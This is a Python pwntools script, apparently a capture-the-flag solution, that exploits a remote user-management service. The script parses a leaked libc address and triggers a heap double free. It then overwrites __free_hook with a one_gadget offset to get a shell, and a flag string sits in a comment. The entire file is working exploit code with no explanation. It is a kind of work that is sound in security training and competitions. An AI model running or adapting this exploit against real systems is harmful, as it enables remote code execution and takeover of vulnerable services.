#!/bin/env python3
from pwn import *

# elf = ELF("libc.so.6")
elf = ELF("libc.so.6")
p = remote("10.21.232.108", 5555)

a = p.recvline()
libc_addr = int(a.split()[4].decode(), 16)
print(libc_addr)
print(elf.sym.__free_hook)


def add(username, lvl):
    p.sendlineafter(b"e[x]it program", b'a')
    p.sendlineafter(b"Enter user name" , username)
    p.sendlineafter(b"Enter user privilege level from 1 (highest) to 4 (lowest)", lvl)
    
def remove(id):
    p.sendlineafter(b"e[x]it program", b'r')  
    p.sendlineafter(b'Enter user number to remove :', id)
    
def pri():
    p.sendlineafter(b"e[x]it program", b'p')

def exi():
    p.sendlineafter(b"e[x]it program", b'x')
    
for i in range(9):
    add(b'a', b'1')
    
remove(b'9')
remove(b'8')
remove(b'7')
remove(b'6')
remove(b'5')
remove(b'4')
remove(b'3')

remove(b'1')
remove(b'2')
remove(b'1')

for i in range(7):
    add(b'a', b'1')
    
add(p64(libc_addr + elf.sym.__free_hook), b'1')
add(b'soham', b'1')
add(b'soham', b'2')
offset = 0x4f302
add(p64(libc_addr + offset), b'1')
remove(b'1')


# print(elf.sym.__malloc_hook)
# print(elf.sym.__free_hook)
# print(elf.sym.system)
# print(hex(next(elf.search(b"/bin/sh"))))

# FTbqHVJWa4 - flag

p.interactive()



